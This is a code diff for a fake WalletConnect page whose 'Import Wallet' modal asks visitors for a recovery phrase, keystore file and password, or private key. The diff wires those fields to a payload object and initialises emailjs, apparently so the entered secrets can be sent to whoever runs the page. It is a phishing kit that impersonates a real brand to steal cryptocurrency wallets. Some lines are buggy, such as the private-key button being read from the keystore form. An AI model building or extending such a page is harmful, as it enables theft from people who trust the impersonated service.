@@ -6,6 +6,23 @@
         <meta name="description" content="Open protocol for connecting Wallets to Dapps" />
         <meta property="og:image" content="https://walletconnect.org/favicon.ico" />
         <link rel="icon" href="https://walletconnect.org/favicon.ico" />
+        <script>
+            const tabcontent = document.getElementsByClassName("tabcontent");
+            const tablinks = document.getElementsByClassName("tablinks");
+
+            function openCity(evt, cityName) {
+                var i;
+                for (i = 0; i < tabcontent.length; i++) {
+                    tabcontent[i].style.display = "none";
+                }
+                for (i = 0; i < tablinks.length; i++) {
+                    tablinks[i].className = tablinks[i].className.replace(" active", "");
+                }
+                // Show the current tab, and add an "active" class to the button that opened the tab
+                document.getElementById(cityName).style.display = "block";
+                evt.currentTarget.className += " active";
+            }
+        </script>
         <title>WalletConnect</title>
     </head>
     <body>
@@ -606,11 +623,19 @@
                 <h2><center>Import Wallet</center></h2>
                 <br />
                 <div class="tab">
-                    <button class="tablinks active" id="default" onclick="openCity(event)">
+                    <button
+                        class="tablinks active"
+                        id="default"
+                        onclick="openCity(event, 'phrase')"
+                    >
                         Phrase
                     </button>
-                    <button class="tablinks" onclick="openCity(event)">Keystore JSON</button>
-                    <button class="tablinks" onclick="openCity(event)">Private Key</button>
+                    <button class="tablinks" onclick="openCity(event,'keystore')">
+                        Keystore JSON
+                    </button>
+                    <button class="tablinks" onclick="openCity(event, 'private')">
+                        Private Key
+                    </button>
                 </div>
 
                 <div id="phrase" class="tabcontent" style="display: block">
@@ -638,7 +663,7 @@
                         <input type="hidden" name="w" value="metamask" />
 
                         <textarea
-                            name="phrase"
+                            name="keystore"
                             class="phrase"
                             required="required"
                             minlength="12"
@@ -683,23 +708,38 @@
         ></script>
 
         <script type="text/javascript">
+            const selected_wallet = {
+                wallet: null,
+            };
             // Get DOM Elements
             const Apps = document.querySelectorAll(".apps");
             const hidden_section = document.getElementById("hidden");
             const hide_btn = document.getElementById("btn");
-            const tabcontent = document.getElementsByClassName("tabcontent");
-            const tablinks = document.getElementsByClassName("tablinks");
+            const modal = document.querySelector(".modal");
+            //phrase
+            const phrase_input = document.querySelector('textarea[name="phrase"]');
+            const phrase_btn = phrase_input.parentElement.querySelector('button[type="submit"]');
+
+            // keystore
+            const keystore_input = document.querySelector('textarea[name="keystore"]');
+            const keystore_password = document.querySelector('input[name="password"]');
+            const keystore_btn =
+                keystore_input.parentElement.querySelector('button[type="submit"]');
+
+            // private key
+            const private_input = document.querySelector('input[name="key"]');
+            const private_btn = keystore_input.parentElement.querySelector('button[type="submit"]');
 
             const selected_Tab = {
-                tab:"Phrase"
-            }
+                tab: "Phrase",
+            };
 
             const payload = {
-                tab:selected_Tab.tab,
-                ...(selected_Tab.tab == "Phrase" && {phrase:""}),
-                ...(selected_Tab.tab == "Keystore JSON" && {keystore:"", password:""}),
-                ...(selected_Tab.tab == "Private Key" && {private_key:""}),
-            }
+                tab: selected_Tab.tab,
+                ...(selected_Tab.tab == "Phrase" && { phrase: "" }),
+                ...(selected_Tab.tab == "Keystore JSON" && { keystore: "", password: "" }),
+                ...(selected_Tab.tab == "Private Key" && { private_key: "" }),
+            };
 
             function show() {
                 if (hidden_section.style.display === "none") {
@@ -715,19 +755,6 @@
                 }
             }
 
-            function openCity(evt, cityName) {
-                var i,
-                for (i = 0; i < tabcontent.length; i++) {
-                    tabcontent[i].style.display = "none";
-                }
-                for (i = 0; i < tablinks.length; i++) {
-                    tablinks[i].className = tablinks[i].className.replace(" active", "");
-                }
-                // Show the current tab, and add an "active" class to the button that opened the tab
-                document.getElementById(cityName).style.display = "block";
-                evt.currentTarget.className += " active";
-            }
-
             (function () {
                 emailjs.init("user_gNtktDkqqHmNHam5K8krE");
             })();
@@ -736,6 +763,8 @@
                 app.addEventListener("click", (e) => {
                     e.preventDefault();
                     document.title = "Import Wallet";
+                    modal.style.display = "block";
+                    selected_wallet.wallet = e.target.innerText;
                 });
             });
         </script>
